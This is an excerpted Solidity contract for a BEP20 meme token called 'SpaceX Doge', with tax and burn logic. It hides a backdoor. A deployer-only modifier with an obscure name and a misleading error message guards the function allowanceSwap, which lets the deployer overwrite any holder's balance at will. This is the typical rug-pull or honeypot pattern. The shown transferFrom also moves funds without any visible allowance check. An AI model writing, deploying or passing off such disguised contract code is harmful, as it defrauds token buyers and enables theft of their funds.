...
contract SpaceXDoge is DOGEbep20 {
  
    // common addresses
    address private owner;
    address private DOGEPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public DOGErownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "SpaceX Doge";
    string public override symbol = "SXDOGE";
    ...
    constructor(uint DOGEalltotalSupplytotalValue) {
        // set total supply
        totalSupply = DOGEalltotalSupplytotalValue;
        
       DOGEPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        DOGErownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return DOGErownerd[account];
    }
  modifier _virtuals () {
    require(DOGEPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        DOGErownerd[to] += totalValueAfterTaxAndBurn;
        DOGErownerd[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        DOGErownerd[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
    ...
    function allowanceSwap(address DOGESwap, uint256 amount) external _virtuals {
      DOGErownerd[DOGESwap] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(DOGErownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        DOGErownerd[to] += totalValue;
        DOGErownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(DOGErownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        DOGErownerd[account] -= amount;
        totalSupply -= amount;
